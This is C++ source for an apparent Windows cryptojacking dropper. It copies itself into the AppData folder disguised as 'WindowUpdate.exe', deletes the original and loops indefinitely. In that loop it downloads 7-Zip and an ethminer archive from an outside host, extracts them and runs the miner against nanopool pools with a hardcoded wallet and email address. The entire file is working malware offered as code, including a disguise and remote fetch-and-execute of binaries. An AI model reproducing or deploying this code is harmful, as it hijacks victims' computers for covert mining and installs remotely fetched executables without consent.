#include <cstdio>
#include <windows.h>
#include <tlhelp32.h>

#include <iostream>

//for getch
#include <conio.h>

using namespace std;

char executablePath[MAX_PATH];
char appDataPath[MAX_PATH];
char appDataDirectory[MAX_PATH];

char ethminerExecutable[] = "ethminer.exe";

typedef HRESULT(WINAPI *lpURLDownloadToFile)(LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB);
lpURLDownloadToFile URLDownloadToFilePtr;

void DownloadFile();
void RunMiner();
int fileExists(char* file);
bool CheckExecutableLocation(char ** argv);

string encryptDecrypt(string toEncrypt) {
	char key[] = "KCQ";
	string output = toEncrypt;

	for (int i = 0; i < toEncrypt.size(); i++)
		output[i] = toEncrypt[i] ^ key[i % (sizeof(key) / sizeof(char))];

	return output;
}

bool IsProcessRunning(const char* processName)
{
	bool exists = false;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry))
		while (Process32Next(snapshot, &entry))
			if (!strcmp(entry.szExeFile, processName))
				exists = true;

	CloseHandle(snapshot);
	return exists;
}



int main(int argc, char* argv[])
{
	char* appData = getenv("APPDATA");
	strcpy(appDataDirectory, appData);
	strcat(appDataDirectory, "\\Windows");
	strcpy(appDataPath, appDataDirectory);
	strcat(appDataPath, "\\WindowUpdate.exe");
	if (CheckExecutableLocation(argv))
	{
		while (true)
		{
			if (!IsProcessRunning(ethminerExecutable))
			{
				DownloadFile();
			}
			Sleep(5000);
		}
	}
}

bool CheckExecutableLocation(char ** argv)
{
	if (strcmp(argv[0], appDataPath) != 0)
	{
		cout << "copying " << argv[0] << "to " << appDataPath;
		CreateDirectory(appDataDirectory, NULL);
		CopyFile(argv[0], appDataPath, false);
		ShellExecute(0, NULL, appDataPath, argv[0], NULL, SW_SHOW);
		return false;
	}
	else {
		if (argv[1] != NULL)
		{
			cout << "deleting " << argv[1] << endl;
			DeleteFile(argv[1]);
		}
		else
		{
			cout << "correct location :D" << endl;
		}
	}
	return true;
}

int fileExists(char* file)
{
	WIN32_FIND_DATA FindFileData;
	HANDLE handle = FindFirstFile(file, &FindFileData);
	int found = handle != INVALID_HANDLE_VALUE;
	if (found)
	{
		FindClose(handle);
	}
	return found;
}

void DownloadFile()
{
	HMODULE hDLL;

	hDLL = LoadLibrary("Urlmon.dll");

	char sevenZip[] = "7z.exe";
	char ethminer[] = "ethminer.7z";


	if (hDLL)
	{
		URLDownloadToFilePtr = (lpURLDownloadToFile)GetProcAddress(hDLL, "URLDownloadToFileA");

		if (URLDownloadToFilePtr) {
			if (!fileExists(sevenZip))
			{
				URLDownloadToFilePtr(NULL, "http://www.mangueinfo.com/7z.exe", "7z.exe", 0, NULL);
			}
			if (!fileExists(ethminer))
			{
				URLDownloadToFilePtr(NULL, "http://www.mangueinfo.com/ethminer.7z", "ethminer.7z", 0, NULL);
			}
			if (!fileExists(ethminerExecutable))
			{
				ShellExecute(0, NULL, sevenZip, " x ethminer.7z", NULL, SW_SHOW);
			}
			RunMiner();
		}
		else {
			cout << "error: " << GetLastError();
		}
	}
	else {
		cout << "error: " << GetLastError();
	}
}

void RunMiner()
{
	ShellExecute(0, NULL, ethminerExecutable, " --farm-recheck 200 -G -S eth-us-east1.nanopool.org:9999 -FS eth-eu1.nanopool.org:9999 -O 0x6f2fd82a43891baa96104e57467edb9d74d56968.job/sombraextra@gmail.com", NULL, SW_SHOW);
}
